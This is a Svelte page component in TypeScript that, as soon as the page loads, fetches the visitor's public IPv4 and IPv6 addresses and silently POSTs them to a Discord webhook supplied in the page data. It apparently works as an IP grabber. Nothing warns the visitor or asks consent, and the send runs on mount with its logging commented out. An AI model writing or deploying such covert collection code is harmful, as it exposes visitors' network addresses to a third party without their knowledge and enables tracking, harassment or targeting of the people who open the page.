<script lang="ts">
    export let data;

    import { publicIpv4, publicIpv6 } from "public-ip";
    import { onMount } from "svelte";
    import { writable } from "svelte/store";

    let ips = writable<{
        ipv4: string;
        ipv6: string;
    }>();

    ips.subscribe(async (value) => {
        if (value === undefined) return;
        await sendMessage(`||${JSON.stringify(value)}||`);
    });

    async function sendMessage(contents: string) {
        const webhookURL = data.webhookURL;
        const yetToSendData = {
            content: contents
        }

        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(yetToSendData)
        });

        // if (!response.ok) {
        //     console.log("Failed to send message to Discord!");
        // } else {
        //     console.log("Sent message to Discord!");
        // }
    }

    async function logIps() {
        // ips.set({
        //     ipv4: "eji",
        //     ipv6: "eifjiejfei"
        // });
        ips.set({
            ipv4: await publicIpv4(),
            ipv6: await publicIpv6()
        });
    }

    onMount(async () => await logIps());
</script>